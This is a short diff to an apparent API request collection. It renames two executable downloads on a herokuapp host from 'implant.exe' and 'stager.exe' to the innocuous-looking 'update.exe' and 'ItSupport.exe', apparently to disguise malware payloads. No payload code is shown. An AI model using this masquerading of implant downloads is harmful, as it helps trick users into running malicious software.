@@ -29,7 +29,7 @@
 					}
 				},
 				"url": {
-					"raw": "https://ch0nkybear.herokuapp.com/implant.exe",
+					"raw": "https://ch0nkybear.herokuapp.com/update.exe",
 					"protocol": "https",
 					"host": [
 						"ch0nkybear",
@@ -37,7 +37,7 @@
 						"com"
 					],
 					"path": [
-						"implant.exe"
+						"update.exe"
 					]
 				}
 			},
@@ -55,7 +55,7 @@
 					}
 				],
 				"url": {
-					"raw": "https://ch0nkybear.herokuapp.com/stager.exe",
+					"raw": "https://ch0nkybear.herokuapp.com/ItSupport.exe",
 					"protocol": "https",
 					"host": [
 						"ch0nkybear",
@@ -63,7 +63,7 @@
 						"com"
 					],
 					"path": [
-						"stager.exe"
+						"ItSupport.exe"
 					]
 				}
 			},
